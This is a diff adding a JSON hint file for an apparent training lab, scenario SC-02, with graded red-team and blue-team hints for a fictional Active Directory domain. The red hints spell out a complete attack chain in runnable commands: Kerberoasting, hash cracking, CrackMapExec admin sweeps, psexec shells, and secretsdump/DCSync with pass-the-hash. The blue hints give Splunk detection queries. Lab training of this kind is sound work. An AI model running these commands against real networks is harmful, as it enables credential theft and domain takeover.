@@ -1,0 +1,38 @@
+{
+  "SC-02": {
+    "red": {
+      "1": {
+        "L1": "You have valid credentials for jsmith. Before running any tool that creates network noise, think about what a professional red teamer does first — map the environment without touching anything.",
+        "L2": "BloodHound collects AD data via LDAP and builds a graph of relationships between users, groups, and computers. It can identify the shortest path from jsmith to Domain Admin before you touch a single attack.",
+        "L3": "Run BloodHound collector: `python3 bloodhound.py -u jsmith -p 'Welcome1!' -d nexora.local -dc 172.20.2.20 -c All`. Then load the JSON output into BloodHound GUI and run the 'Shortest Path to Domain Admin' query."
+      },
+      "2": {
+        "L1": "You want to escalate privileges. There's a service account in the domain that has a Service Principal Name (SPN) set. What does that mean for the type of Kerberos ticket you can request for it?",
+        "L2": "Kerberoasting requests a TGS ticket for any account with an SPN — the ticket is encrypted with the account's NTLM hash. If the account has a weak password, you can crack it offline. BloodHound shows which accounts are Kerberoastable.",
+        "L3": "Run `impacket-GetUserSPNs nexora.local/jsmith:'Welcome1!' -dc-ip 172.20.2.20 -request`. This outputs hashes in hashcat format. Then crack with `hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`."
+      },
+      "3": {
+        "L1": "You have cracked a service account password. Before you use it to move laterally, check what privileges svc_backup has on other machines in the domain — BloodHound will show this.",
+        "L2": "CrackMapExec can verify credentials and enumerate local admin access across the domain in one command. A service account used for backups often has local admin rights on servers it backs up.",
+        "L3": "Run `crackmapexec smb 172.20.2.0/24 -u svc_backup -p '<cracked_password>' --local-auth`. Any host marked (Pwn3d!) indicates local admin. From there, use `impacket-psexec` or `impacket-wmiexec` to get a shell."
+      },
+      "4": {
+        "L1": "You have administrative access on a domain workstation. What credential material might be available in memory that would let you escalate further without needing to crack more passwords?",
+        "L2": "LSASS memory contains cached credentials for recently logged-in users. If a Domain Admin logged into this workstation recently, their NTLM hash or Kerberos ticket may be in memory.",
+        "L3": "From a shell on WS01: `python3 impacket-secretsdump nexora.local/svc_backup:'<password>'@172.20.2.30`. Look for any high-value account hashes. To perform DCSync once you have DA privileges: `impacket-secretsdump nexora.local/Administrator@172.20.2.20 -hashes :<NTLM_HASH>`."
+      }
+    },
+    "blue": {
+      "1": {
+        "L1": "Event ID 4769 with encryption type 0x17 (RC4-HMAC) is a Kerberoasting indicator. Why is RC4 the tell-tale sign rather than AES encryption?",
+        "L2": "Modern AD uses AES-256 for Kerberos tickets by default. RC4 tickets are only issued when explicitly requested — which is what Kerberoasting tools do. Filter Event 4769 for EncryptionType=0x17 from non-service IPs.",
+        "L3": "Splunk query: `index=winevent EventCode=4769 TicketEncryptionType=0x17 | stats count by ServiceName, ClientAddress | where count > 2`. Any non-service-to-service request using RC4 is suspicious. The ServiceName should be a service account, not a user or computer account."
+      },
+      "2": {
+        "L1": "You've identified the attacking IP. Before you contain it, check if lateral movement has already occurred. What event IDs indicate successful remote logons from this IP to other hosts?",
+        "L2": "Event 4624 with Logon Type 3 (network) shows remote authentication. If the same IP or the compromised account authenticated to multiple hosts within a short window, you have lateral movement confirmed.",
+        "L3": "Splunk: `index=winevent EventCode=4624 LogonType=3 | search IpAddress=<ATTACKER_IP> OR SubjectUserName=svc_backup | stats count by ComputerName, TargetUserName | sort -count`. Any account touching >2 machines in the same session window is lateral movement."
+      }
+    }
+  }
+}
